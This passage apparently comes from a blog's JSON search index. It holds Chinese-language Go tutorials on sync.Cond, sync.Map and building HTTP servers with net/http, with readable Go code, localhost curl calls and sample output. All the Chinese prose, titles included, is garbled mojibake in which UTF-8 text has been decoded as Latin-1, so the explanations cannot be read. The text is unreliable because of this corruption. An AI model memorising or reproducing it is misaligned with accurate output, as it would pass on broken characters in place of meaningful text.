çš„ä»»æ„ä½ç½®åˆå§‹åŒ–å’Œè°ƒç”¨ï¼Œå› æ­¤å¯ä»¥å»¶è¿Ÿåˆ°ä½¿ç”¨æ—¶å†æ‰§è¡Œï¼Œå¹¶å‘åœºæ™¯ä¸‹æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:6:0","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"sync.Cond æ¡ä»¶å˜é‡ sync.Cond ç”¨äºåè°ƒå¤šä¸ªåç¨‹è®¿é—®å…±äº«èµ„æº, å…¶ä¸­æŸäº›åç¨‹å¤„äºé˜»å¡çŠ¶æ€, å¦å¤–ä¸€ä¸ªåç¨‹åœ¨æ¡ä»¶å‡†å¤‡å¥½çš„æ—¶å€™æ¥è®²å…¶å®ƒåç¨‹å”¤é†’. ä¸‹é¢çš„ä¾‹å­ä¸­ InitEnvå‡½æ•°éœ€è¦ä¸€ç‚¹æ—¶é—´åœ¨å‡†å¤‡sharedCounter çš„åˆå§‹å€¼, åœ¨è¿™æœŸé—´Addå’Œsubå¤„äºWaitçŠ¶æ€, å½“å‡†å¤‡å¥½å, å°†é€šçŸ¥ Addå’ŒSubç»§ç»­å‘ä¸‹æ‰§è¡Œ package main import ( \"fmt\" \"sync\" \"time\" ) var ( sharedCounter int ) func InitEnv(c *sync.Cond) { fmt.Println(\"begin InitEnv\") time.Sleep(time.Second * 1) c.L.Lock() sharedCounter = 10 c.L.Unlock() fmt.Println(\"Init Env Done, broadcast...\") c.Broadcast() } func Add(cout int, c *sync.Cond) { c.L.Lock() c.Wait() sharedCounter += cout c.L.Unlock() fmt.Println(\"Add Done\") } func Sub(count int, c *sync.Cond) { c.L.Lock() c.Wait() sharedCounter -= count c.L.Unlock() fmt.Println(\"Sub Done\") } func main() { cond := sync.NewCond(\u0026sync.Mutex{}) go InitEnv(cond) go Add(5, cond) go Sub(2, cond) time.Sleep(2 * time.Second) fmt.Println(\"Final Counter:\", sharedCounter) } è¾“å‡º begin InitEnv Init Env Done, broadcast... Add Done Sub Done Final Counter: 13 c.Broadcast()å”¤é†’æ‰€æœ‰ç­‰å¾…çš„åç¨‹, å¦å¤–è¿˜æœ‰ä¸€ä¸ªSignal()æ–¹æ³•, ç”¨äºå”¤é†’ä¸€ä¸ªåç¨‹. sync.Condä¸€èˆ¬ç”¨äºä¸€å¯¹å¤šçš„æƒ…å†µ, å¦‚æœæ˜¯ä¸€å¯¹ä¸€çš„æƒ…å†µ, ç”¨ä¸€ä¸ªä¿¡é“å°±å¯ä»¥è½»æ¾è§£å†³äº† ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:7:0","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"sync.Map å†…ç½®çš„mapä¸æ˜¯å¹¶å‘å®‰å…¨çš„, æ‰€ä»¥ sync.Map æä¾›äº†ä¸€ä¸ªåŠŸèƒ½ä¸mapç±»ä¼¼ä½†æ˜¯å¹¶å‘å®‰å…¨çš„ç‰ˆæœ¬ å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  https://juejin.cn/post/6844903895227957262 ","date":"2022-06-12","objectID":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/:8:0","tags":["go","sync"],"title":"èŠèŠgoè¯­è¨€ä¸­çš„sync","uri":"/%E8%81%8A%E8%81%8Ago%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84sync/"},{"categories":["golang"],"content":"goè¯­è¨€ä¸­net/httpåŒ…å¯¹httpæœåŠ¡ä¸è¯·æ±‚çš„å¤„ç† ","date":"2022-06-06","objectID":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/:0:0","tags":["go","http"],"title":"Goè¯­è¨€ä¸­çš„httpæœåŠ¡å™¨","uri":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["golang"],"content":"ç®€å•çš„æ–‡ä»¶æœåŠ¡å™¨ package main import ( \"log\" \"net/http\" ) func main() { err := http.ListenAndServe(\":8080\", http.FileServer(http.Dir(\".\"))) if err != nil { log.Fatal(err) } } ä¸Šé¢è¿™ä¸ªä¾‹å­åˆ›å»ºäº†ä¸€ä¸ªä»¥å½“å‰ç›®å½•ä¸ºç«™ç‚¹è·Ÿç›®å½•çš„æ–‡ä»¶æœåŠ¡å™¨, æˆ‘ä¸€èˆ¬ç”¨è¿™ä¸ªæ¥ä½œä¸ºå±€åŸŸç½‘æ–‡ä»¶å…±äº«. ç„¶åå†™ä¸€ä¸ªå‡½æ•°æ”¾åˆ°bash.rc æˆ–zshrcä¸­ #æ–‡ä»¶æœåŠ¡å™¨ function fileserver(){ echo \"start file server :12345\" cat \u003c\u003cEOF | tee /tmp/fileserver.go | go run /tmp/fileserver.go package main import ( \"log\" \"net/http\" ) func main() { err := http.ListenAndServe(\":12345\", http.FileServer(http.Dir(\".\"))) if err != nil { log.Fatal(err) } } EOF } OSX MP16 ~/Downloads â¯ fileserver start file server :12345 Pythonä¸­æœ‰ç›¸åŒçš„åŠŸèƒ½ python3 -m SimpleHTTPServer 7777 æˆ– python3 -m http.server ","date":"2022-06-06","objectID":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/:1:0","tags":["go","http"],"title":"Goè¯­è¨€ä¸­çš„httpæœåŠ¡å™¨","uri":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["golang"],"content":"ä¸€ä¸ªç®€å•çš„WebServer package main import ( \"log\" \"net/http\" ) func main() { http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { _, err := w.Write([]byte(\"Hello World!\\n\")) if err != nil { log.Println(err) } }) err := http.ListenAndServe(\":12345\", nil) if err != nil { log.Fatal(err) } } è®¿é—®ä¸€ä¸‹è¯•è¯•: OSX MP16 ~/Downloads/goplayground â¯ curl http://localhost:12345 Hello World! ","date":"2022-06-06","objectID":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/:2:0","tags":["go","http"],"title":"Goè¯­è¨€ä¸­çš„httpæœåŠ¡å™¨","uri":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["golang"],"content":"http.HandleFunc http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { //... }) è¯¥æ–¹æ³•æä¾›äº†ä¸€ç§æŒ‡å®šå¦‚ä½•å¤„ç†ç‰¹å®šè·¯ç”±çš„è¯·æ±‚çš„æ–¹æ³•, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè·¯ç”±, ç¬¬äºŒä¸ªå‚æ•°ä¸ºå¤„ç†å‡½æ•°. å¤„ç†å‡½æ•°å¯å†™æˆåŒ¿åå‡½æ•°, ä¹Ÿå¯ä»¥å£°æ˜ä¸ºä¸€ä¸ªç‹¬ç«‹çš„å‡½æ•° func rootHandler(w http.ResponseWriter, r *http.Request) { _, err := w.Write([]byte(\"\u003ch1 style=\\\"color:Tomato;\\\"\u003eHello World\u003c/h1\u003e\")) if err != nil { log.Println(err) } } func main() { http.HandleFunc(\"/\", rootHandler) //... } å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯http.ResponseWriterç±»å‹çš„å€¼ã€‚è¿™æ˜¯ç”¨äºå‘ä»»ä½•è¿æ¥çš„HTTPå®¢æˆ·ç«¯å‘é€å“åº”çš„æœºåˆ¶ã€‚è¿™ä¹Ÿæ˜¯å“åº”æ ‡å¤´çš„è®¾ç½®æ–¹å¼,æ¯”å¦‚w.WriteHeader(http.StatusOK)ã€‚ç¬¬äºŒä¸ªè®ºç‚¹æ˜¯æŒ‡å‘http.Requestçš„æŒ‡é’ˆã€‚è¿™æ˜¯ä»ç½‘ç»œè¯·æ±‚ä¸­æ£€ç´¢æ•°æ®çš„æ–¹å¼ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡è¯·æ±‚æŒ‡é’ˆè®¿é—®è¡¨å•æäº¤çš„è¯¦ç»†ä¿¡æ¯ æ¯”å¦‚ ä¸‹é¢çš„æ–¹æ³•, ä½¿ç”¨ http://127.0.0.1:12345/?key=date æ—¶å°†è¿”å›å½“å‰çš„æ—¥æœŸ, ç¡®å®key=æˆ–keyä¸æ­£ç¡®æ—¶è¿”å›http.StatusBadRequest func rootHandler(w http.ResponseWriter, r *http.Request) { keys, ok := r.URL.Query()[\"key\"] if !ok || len(keys[0]) \u003c 1 { log.Println(\"Url Param 'key' is missing\") w.WriteHeader(http.StatusBadRequest) _, err := w.Write([]byte(\"Url Param 'key' is missing\")) if err != nil { log.Println(err) return } return } key := keys[0] switch key { case \"date\": w.WriteHeader(http.StatusOK) _, err := w.Write([]byte(time.Now().Format(\"2006-01-02\"))) if err != nil { log.Println(err) } default: w.WriteHeader(http.StatusBadRequest) _, _ = w.Write([]byte(\"Invalid key\")) log.Println(\"Invalid key\") } } ","date":"2022-06-06","objectID":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/:3:0","tags":["go","http"],"title":"Goè¯­è¨€ä¸­çš„httpæœåŠ¡å™¨","uri":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["golang"],"content":"http.ResponseWriter ç”¨äºå‘ä»»ä½•è¿æ¥çš„HTTPå®¢æˆ·ç«¯å‘é€å“åº” è®¾ç½®ç›¸åº”æ ‡å¿—å¤´: w.WriteHeader(http.StatusOK) è·å–æˆ–å®åˆ™å“åº”å¤´ w.Header().Set(\"content-type\", \"application/json\") w.Header().Add(\"foo\", \"bar\") å†™å…¥ç›¸åº”æ•°æ®: w.Write([]byte(time.Now().Format(\"2006-01-02\"))) ä¾‹å­: package main import ( \"encoding/json\" \"log\" \"net/http\" ) type SystemInfo struct { Hostname string `json:\"hostname\"` Uptime string `json:\"uptime\"` } func rootHandler(w http.ResponseWriter, r *http.Request) { info := SystemInfo{ Hostname: \"test\", Uptime: \"2022-01-01 00:00:00\", } w.Header().Set(\"Content-Type\", \"application/json\") w.WriteHeader(http.StatusOK) bytes, _ := json.Marshal(info) _, err := w.Write(bytes) if err != nil { log.Println(\"Error writing response: \", err) } } func main() { http.HandleFunc(\"/\", rootHandler) err := http.ListenAndServe(\":12345\", nil) if err != nil { log.Fatal(err) } } OSX MP16 ~ â¯ curl localhost:12345 {\"hostname\":\"test\",\"uptime\":\"2022-01-01 00:00:00\"} ","date":"2022-06-06","objectID":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/:3:1","tags":["go","http"],"title":"Goè¯­è¨€ä¸­çš„httpæœåŠ¡å™¨","uri":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["golang"],"content":"*http.Request æŒ‡å‘http.Requestçš„æŒ‡é’ˆ, é€šè¿‡æ”¹æŒ‡é’ˆå¯ä»¥è·å–è¯·æ±‚ä¸­çš„å„ç§æ•°æ®, æ¯”å¦‚ è·å–åŸºæœ¬ä¿¡æ¯ func rootHandler(w http.ResponseWriter, r *http.Request) { fmt.Println(\"User Agent: \", r.UserAgent()) fmt.Println(\"Host: \", r.Host) fmt.Println(\"Remote Address: \", r.RemoteAddr) fmt.Println(\"Request URI: \", r.RequestURI) fmt.Println(\"Method: \", r.Method) fmt.Println(\"URL: \", r.URL) fmt.Println(\"Header: \", r.Header) w.WriteHeader(http.StatusOK) } è¾“å‡º: User Agent: curl/7.79.1 Host: localhost:12345 Remote Address: 127.0.0.1:58967 Request URI: / Method: GET URL: / Header: map[Accept:[*/*] User-Agent:[curl/7.79.1]] è·å–cookie func rootHandler(w http.ResponseWriter, r *http.Request) { //è·å–æ‰€æœ‰ for _, c := range r.Cookies() { fmt.Printf(\"%s : %q\\n\", c.Name, c.Value) } //è·å–æŒ‡å®š c, err := r.Cookie(\"token\") if err != nil { log.Println(err) } fmt.Printf(\"%s : %q\\n\", c.Name, c.Value) w.WriteHeader(http.StatusOK) } curl --cookie \"token=abcdefg\" http://localhost:12345 è·å–GETå‚æ•° è·å–æ‰€æœ‰å‚æ•° args := r.URL.Query() è·å–æŒ‡å®šå‚æ•°(æ³¨:å‚æ•°å¯èƒ½è¢«é‡å¤å†™å¤šæ¬¡) æ¯”å¦‚: localhost:12345/?id=5 func rootHandler(w http.ResponseWriter, r *http.Request) { ids, ok := r.URL.Query()[\"id\"] if !ok || len(ids[0]) \u003c 1 { log.Println(\"Url Param 'id' is missing\") return } id := ids[0] log.Println(\"Url Param 'id' is: \" + id) w.WriteHeader(http.StatusOK) } æˆ–è€… func rootHandler(w http.ResponseWriter, r *http.Request) { id := r.FormValue(\"id\") if id == \"\" { log.Println(\"Url Param 'id' is missing\") } fmt.Println(\"id:\", id) w.WriteHeader(http.StatusOK) } ä¹Ÿå¯ä»¥é€šè¿‡r.Formæ¥è·å–Getå‚æ•° è·å–PATCH, POST or PUTå‚æ•° æ¯”å¦‚ curl -d \"id=5\u0026format=1\" http://localhost:12345/ func rootHandler(w http.ResponseWriter, r *http.Request) { //parse err := r.ParseForm() if err != nil { log.Println(\"ParseForm error:\", err) } //get post args for k, v := range r.PostForm { log.Println(\"key:\", k) log.Println(\"val:\", v) // v []string } w.WriteHeader(http.StatusOK) } è¾“å‡º 2022/06/06 15:14:46 key: id 2022/06/06 15:14:46 val: [5] 2022/06/06 15:14:46 key: format 2022/06/06 15:14:46 val: [1] ParseFormä¼šå¡«å……r.Formå’Œr.PostFormã€‚ å¯¹äºæ‰€æœ‰çš„è¯·æ±‚ï¼ŒParseFormè§£ææ¥è‡ªURLçš„åŸå§‹æŸ¥è¯¢å¹¶æ›´æ–°r.Formã€‚ å¯¹äºPOSTã€PUTå’ŒPATCHè¯·æ±‚ï¼Œå®ƒä¹Ÿè¯»å–è¯·æ±‚æ­£æ–‡ï¼Œå°†å…¶è§£æä¸ºä¸€ä¸ªè¡¨å•ï¼Œå¹¶å°†ç»“æœæ”¾å…¥r.PostFormå’Œr.Formä¸­ã€‚åœ¨r.Formä¸­ï¼Œè¯·æ±‚æ­£æ–‡å‚æ•°ä¼˜å…ˆäºURLæŸ¥è¯¢å­—ç¬¦ä¸²å€¼ã€‚ å¦‚æœè¯·æ±‚ä½“çš„å¤§å°è¿˜æ²¡æœ‰è¢«MaxBytesReaderé™åˆ¶ï¼Œé‚£ä¹ˆå…¶å¤§å°å°†è¢«é™åˆ¶åœ¨10MBã€‚ å¯¹äºå…¶ä»–HTTPæ–¹æ³•ï¼Œæˆ–è€…å½“å†…å®¹ç±»å‹ä¸æ˜¯application/x-www-form-urlencodedæ—¶ï¼Œè¯·æ±‚æ­£æ–‡ä¸è¢«è¯»å–ï¼Œå¹¶ä¸”r.PostFormè¢«åˆå§‹åŒ–ä¸ºä¸€ä¸ªéé›¶çš„ç©ºå€¼ã€‚ ParseMultipartFormè‡ªåŠ¨è°ƒç”¨ParseFormã€‚ParseFormæ˜¯å¹‚ç­‰çš„ã€‚ r.Formå±æ€§åŒ…å«äº†postè¡¨å•å’Œurlä¸­çš„getå‚æ•°ã€‚ r.PostFormå±æ€§åªåŒ…å«äº†postè¡¨å•å‚æ•°ã€‚ è·å–æŒ‡å®šå‚æ•°, æ¯”å¦‚ func rootHandler(w http.ResponseWriter, r *http.Request) { err := r.ParseForm() if err != nil { log.Println(\"ParseForm error:\", err) } ids := r.PostForm.Get(\"id\") //è·å–idå‚æ•°çš„ç¬¬ä¸€ä¸ªå€¼ log.Println(\"id:\", ids) w.WriteHeader(http.StatusOK) } æˆ–è€… func rootHandler(w http.ResponseWriter, r *http.Request) { id := r.PostFormValue(\"id\") if id == \"\" { log.Println(\"Url Param 'id' is missing\") } fmt.Println(\"id:\", id) w.WriteHeader(http.StatusOK) } è·å–ä¸Šä¼ æ–‡ä»¶ æ¯”å¦‚ curl -F \"file=@IMG_1526.PNG;type=image/png\" http://localhost:12345/upload ä¸‹é¢ä»£ç ä¸­: r.ParseMultipartForm(10 \u003c\u003c 20)å°†ä¸€ä¸ªè¯·æ±‚ä½“è§£æä¸ºmultipart/form-dataã€‚æ•´ä¸ªè¯·æ±‚æ­£æ–‡è¢«è§£æï¼Œå¹¶ä¸”å…¶æ–‡ä»¶éƒ¨åˆ†æœ€å¤šå­˜å‚¨åœ¨maxMemoryå­—èŠ‚çš„å†…å­˜ä¸­ï¼Œå…¶ä½™éƒ¨åˆ†åˆ™å­˜å‚¨åœ¨ç£ç›˜çš„ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ParseMultipartFormåœ¨å¿…è¦æ—¶è°ƒç”¨ParseFormã€‚å¦‚æœParseFormè¿”å›ä¸€ä¸ªé”™è¯¯ï¼ŒParseMultipartFormå°†å…¶è¿”å›ï¼Œä½†ä¹Ÿç»§ç»­è§£æè¯·æ±‚æ­£æ–‡ã€‚åœ¨å¯¹ParseMultipartFormè¿›è¡Œä¸€æ¬¡è°ƒç”¨åï¼Œéšåçš„è°ƒç”¨æ²¡æœ‰ä»»ä½•å½±å“. FormFile è¿”å›æä¾›çš„è¡¨å•keyçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚å¦‚æœéœ€è¦ï¼ŒFormFileä¼šè°ƒç”¨ParseMultipartFormå’ŒParseFormã€‚ package main import ( \"io\" \"log\" \"mime/multipart\" \"net/http\" \"os\" ) func uploadHandler(w http.ResponseWriter, r *http.Request) { // Parse the multipart form in the request err := r.ParseMultipartForm(10 \u003c\u003c 20) // 10 MiB if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } // FormFile returns the first file for the given key `file` // it also returns the FileHeader, so we can get the Filename, the Header and the size of the file file, handler, err := r.FormFile(\"file\") if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } defer func(file multipart.File) { err := file.Close() if err != nil { log.Println(err) } }(file) err = os.MkdirAll(\"./upload\", 0777) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) re","date":"2022-06-06","objectID":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/:3:2","tags":["go","http"],"title":"Goè¯­è¨€ä¸­çš„httpæœåŠ¡å™¨","uri":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["golang"],"content":"Handler , Handle , HandleFunc ä¸ http.ListenAndServe ä½¿ç”¨é»˜è®¤çš„Handler å…ˆçœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ package main import \"net/http\" func main() { http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(\"Hello, world!\")) }) http.HandleFunc(\"/blog\", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(\"This is my Blog\")) }) http.ListenAndServe(\":12345\", nil) } åœ¨å¯åŠ¨ä¸€ä¸ªHttpServerçš„æ—¶å€™, å…¶å®æˆ‘ä»¬å°±å…³å¿ƒ2ä¸ªä¸œè¥¿: åœ°å€ è·¯ç”±: å°†è¯·æ±‚å¯¹åº”åˆ°ç›¸åº”çš„å¤„ç†å‡½æ•°ä¸­å» è¿™ä¸¤ä¸ªå‚æ•° åœ¨http.ListenAndServe(\":12345\", nil)ä¸­è¿›è¡Œè®¾ç½®çš„, ç¬¬ä¸€ä¸ªä¸ºåœ°å€, ç¬¬äºŒä¸ªä¼ é€’å¤„ç†å‡½æ•°. å¦‚æœä¼ é€’nil, åˆ™é‡‡ç”¨é»˜è®¤çš„ The handler is typically nil, in which case the DefaultServeMux is used. http.ListenAndServeçš„å®ç°å¦‚ä¸‹: func ListenAndServe(addr string, handler Handler) error { server := \u0026Server{Addr: addr, Handler: handler} return server.ListenAndServe() } type Handler interface { ServeHTTP(ResponseWriter, *Request) } å¯ä»¥çœ‹åˆ° Handleræ˜¯ä¸€ä¸ªæ¥å£, å®ç°è¿™ä¸ªæ¥å£çš„è¯, æˆ‘ä»¬å¯ä»¥åˆ›å»ºè‡ªå·±çš„Handler è‡ªå®šä¹‰Handler å®šä¹‰ä¸€ä¸ªç»“æ„ä½“, ç»“æ„ä½“å®ç° ServeHTTP(w http.ResponseWriter, r *http.Request)æ–¹æ³• ç„¶åä½¿ç”¨ Handleå‡½æ•°è¿›è¡Œè·¯ç”±æ³¨å†Œ package main import \"net/http\" type MyIndexHandler struct { } func (h *MyIndexHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) { w.Write([]byte(\"Hello World\")) } type MyBlogHandler struct { } func (h *MyBlogHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) { w.Write([]byte(\"This is my Blog\")) } func main() { mux := http.NewServeMux() mux.Handle(\"/\", \u0026MyIndexHandler{}) mux.Handle(\"/blog\", \u0026MyBlogHandler{}) http.ListenAndServe(\":12345\", mux) } OSX MP16 ~ â¯ curl localhost:12345 Hello World OSX MP16 ~ â¯ curl localhost:12345/blog This is my Blog OSX MP16 ~ â¯ ä½†è¿™æ˜æ˜¾çœ‹å‡ºæ¥, å¯¹æ¯ä¸€ä¸ªè·¯ç”± éƒ½è¦é«˜å†™ä¸€ä¸ªxxxHandlerç»“æ„ä½“å’Œå®ç°ServeHTTP, çœ‹ä¸Šå»éå¸¸æ··ä¹± è¿™æ—¶å€™å°±å¯ä»¥ç”¨mux.HandleFuncæ¥å®ç°è·¯ç”± package main import \"net/http\" func main() { mux := http.NewServeMux() mux.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(\"Hello World\")) }) mux.HandleFunc(\"/blog\", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(\"This is my Blog\")) }) http.ListenAndServe(\":12345\", mux) } è‡ªå®šä¹‰ServeMux åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­, mux := http.NewServeMux()è¿˜æ˜¯ä½¿ç”¨äº†é»˜è®¤router, å…¶ç®€å•çš„åŒæ—¶ä¹Ÿæœ‰ä¸å°‘ç¼ºç‚¹ æ¯”å¦‚, å…¶æ˜¯é€šè¿‡urlè¿›è¡Œè·¯ç”±, ä½†ä¸æ”¯æŒåŸºäºæ–¹æ³•(GET, POSTâ€¦)çš„è·¯ç”±, ä¸æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ç­‰ç­‰ å‚è€ƒè¿™ä¸ª https://www.alexedwards.net/blog/which-go-router-should-i-use ","date":"2022-06-06","objectID":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/:3:3","tags":["go","http"],"title":"Goè¯­è¨€ä¸­çš„httpæœåŠ¡å™¨","uri":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"categories":["golang"],"content":"äººæ°”Webæ¡†æ¶ å‚è€ƒè¿™ç¯‡æ–‡ç« , https://blog.51cto.com/coderaction/3001008 å…¶ä¸­æœ‰å„æ¡†æ¶çš„å¯¹æ¯”, åŠŸèƒ½ä¸Širisæœ€å…¨ https://github.com/kataras/iris ","date":"2022-06-06","objectID":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/:4:0","tags":["go","http"],"title":"Goè¯­è¨€ä¸­çš„httpæœåŠ¡å™¨","uri":"/go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84http%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]